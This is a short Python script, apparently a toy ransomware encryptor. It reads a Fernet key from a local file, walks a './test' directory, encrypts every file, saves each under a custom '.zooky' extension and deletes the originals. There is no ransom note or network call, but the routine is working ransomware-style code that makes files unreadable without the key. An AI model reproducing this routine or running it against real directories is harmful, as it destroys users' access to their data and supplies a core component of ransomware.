import os
from cryptography.fernet import Fernet

with open('filekey.key', 'rb') as filekey: 
    key = filekey.read()

fernet = Fernet(key) 

for path, subdirs, files in os.walk('./test'):
    for name in files:
        print(os.path.join(path, name))
        filepath = os.path.join(path, name)
        with open(filepath, 'rb') as file: 
            original = file.read()
      
        encrypted = fernet.encrypt(original) 
  
        with open(filepath+'.zooky', 'wb') as encrypted_file: 
             encrypted_file.write(encrypted)
        os.remove(filepath)
    

